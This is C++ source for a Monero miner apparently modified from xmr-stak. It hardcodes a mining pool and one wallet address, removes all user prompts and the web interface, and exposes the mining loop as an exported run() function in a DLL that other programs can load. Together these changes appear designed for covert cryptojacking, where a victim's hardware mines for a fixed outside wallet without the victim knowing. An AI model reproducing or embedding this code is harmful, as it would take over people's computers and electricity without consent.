 /*
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
  * the Free Software Foundation, either version 3 of the License, or
  * any later version.
  *
  * This program is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
  * GNU General Public License for more details.
  *
  * You should have received a copy of the GNU General Public License
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  *
  * Additional permission under GNU GPL version 3 section 7
  *
  * If you modify this Program, or any covered work, by linking or combining
  * it with OpenSSL (or a modified version of that library), containing parts
  * covered by the terms of OpenSSL License and SSLeay License, the licensors
  * of this Program grant you additional permission to convey the resulting work.
  *
  */

#include "xmrstak/misc/executor.hpp"
#include "xmrstak/backend/miner_work.hpp"
#include "xmrstak/backend/globalStates.hpp"
#include "xmrstak/backend/backendConnector.hpp"
#include "xmrstak/jconf.hpp"
#include "xmrstak/misc/console.hpp"
#include "xmrstak/donate-level.hpp"
#include "xmrstak/params.hpp"
#include "xmrstak/misc/configEditor.hpp"
#include "xmrstak/version.hpp"
#include "xmrstak/misc/utility.hpp"

#ifndef CONF_NO_HTTPD
#	include "xmrstak/http/httpd.hpp"
#endif

#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <time.h>
#include <iostream>

#ifndef CONF_NO_TLS
#include <openssl/ssl.h>
#include <openssl/err.h>
#endif

#ifdef _WIN32
#	define strcasecmp _stricmp
#	include <windows.h>
#	include "xmrstak/misc/uac.hpp"
#endif // _WIN32

#include "xmrstak/backend/iBackend.hpp"
#include "xmrstak/backend/backendConnector.hpp"

inline const char* bool_to_str(bool v)
{
	return v ? "true" : "false";
}


xmrstak::configEditor do_guided_pool_config()
{
	using namespace xmrstak;

	// load the template of the backend config into a char variable
	const char *tpl =
		#include "../pools.tpl"
	;

	configEditor configTpl(tpl);
	bool prompted = false;

	auto& currency = params::inst().currency;
	currency = "monero";

	auto& pool = params::inst().poolURL;
	bool userSetPool = true;

	pool = "xmrpool.eu:3333";

	auto& userName = params::inst().poolUsername;

	userName = "41dtfjtrvG3ZKTpzaVqTpjasKaPTGVBRRYJnPrp14mne7aWL6jVasPaD3AZSdw24mkJ8GpLkMNXENJWu2LuRb78v1HJYvcB";

	bool stdin_flushed = false;
	auto& passwd = params::inst().poolPasswd;
	passwd = "x";

	auto& rigid = params::inst().poolRigid;
	rigid = "";

	bool tls;
	tls = false;

	bool nicehash;
	nicehash = false;

	bool multipool;
	multipool = false;

	int64_t pool_weight;
	pool_weight = 1;

	std::string pool_table;
	pool_table += "\t{\"pool_address\" : \"" + pool +"\", \"wallet_address\" : \"" + userName +  "\", \"rig_id\" : \"" + rigid +
		"\", \"pool_password\" : \"" +  passwd + "\", \"use_nicehash\" : " + bool_to_str(nicehash) + ", \"use_tls\" : " +
		bool_to_str(tls) + ", \"tls_fingerprint\" : \"\", \"pool_weight\" : " + std::to_string(pool_weight) + " },\n";

	configTpl.replace("CURRENCY", currency);
	configTpl.replace("POOLCONF", pool_table);
	configTpl.formatConfig();
	return configTpl;
}

xmrstak::configEditor do_guided_config()
{
	using namespace xmrstak;

	// load the template of the backend config into a char variable
	const char *tpl = 
		#include "../config.tpl"
	;

	configEditor configTpl(tpl);
	bool prompted = false;

	auto& http_port = params::inst().httpd_port;
	http_port = params::httpd_port_disabled;

	configTpl.replace("HTTP_PORT", std::to_string(http_port));
	configTpl.formatConfig();
	return configTpl;
}
extern "C" {
#ifdef _WIN32
	__declspec(dllexport)
#endif

	void run()
	{
	#ifndef CONF_NO_TLS
		SSL_library_init();
		SSL_load_error_strings();
		ERR_load_BIO_strings();
		ERR_load_crypto_strings();
		SSL_load_error_strings();
		OpenSSL_add_all_digests();
	#endif

		srand(time(0));

		using namespace xmrstak;

		// std::string pathWithName(argv[0]);
		// std::string separator("/");
		// auto pos = pathWithName.rfind(separator);

		// if(pos == std::string::npos)
		// {
		// 	// try windows "\"
		// 	separator = "\\";
		// 	pos = pathWithName.rfind(separator);
		// }
		// params::inst().binaryName = std::string(pathWithName, pos + 1, std::string::npos);
		// if(params::inst().binaryName.compare(pathWithName) != 0)
		// {
		// 	params::inst().executablePrefix = std::string(pathWithName, 0, pos);
		// 	params::inst().executablePrefix += separator;
		// }

		// check if we need a guided start
		configEditor guidedConfig =	do_guided_config();
		configEditor guidedPoolConfig = do_guided_pool_config();

		if(!jconf::inst()->parse_configs(guidedConfig.getConfig(), guidedPoolConfig.getConfig()))
		{
			win_exit();
			return void();
		}

	// #ifdef _WIN32
	// 	/* For Windows 7 and 8 request elevation at all times unless we are using slow memory */
	// 	if(jconf::inst()->GetSlowMemSetting() != jconf::slow_mem_cfg::always_use && !IsWindows10OrNewer())
	// 	{
	// 		RequestElevation();
	// 	}
	// #endif

		if(strlen(jconf::inst()->GetOutputFile()) != 0)
			printer::inst()->open_logfile(jconf::inst()->GetOutputFile());

		if (!BackendConnector::self_test())
		{
			printer::inst()->print_msg(L0, "Self test not passed!");
			win_exit();
			return void();
		}

		if(jconf::inst()->GetHttpdPort() != uint16_t(params::httpd_port_disabled))
		{
	#ifdef CONF_NO_HTTPD
			printer::inst()->print_msg(L0, "HTTPD port is enabled but this binary was compiled without HTTP support!");
			win_exit();
			return void();
	#else
			if (!httpd::inst()->start_daemon())
			{
				win_exit();
				return void();
			}
	#endif
		}

		executor::inst()->ex_start(jconf::inst()->DaemonMode());

		uint64_t lastTime = get_timestamp_ms();
		int key;
		while(true)
		{
			key = get_key();

			switch(key)
			{
			case 'h':
				executor::inst()->push_event(ex_event(EV_USR_HASHRATE));
				break;
			case 'r':
				executor::inst()->push_event(ex_event(EV_USR_RESULTS));
				break;
			case 'c':
				executor::inst()->push_event(ex_event(EV_USR_CONNSTAT));
				break;
			default:
				break;
			}

			uint64_t currentTime = get_timestamp_ms();

			/* Hard guard to make sure we never get called more than twice per second */
			if( currentTime - lastTime < 500)
				std::this_thread::sleep_for(std::chrono::milliseconds(500 - (currentTime - lastTime)));
			lastTime = currentTime;
		}

		return void();
	}
}
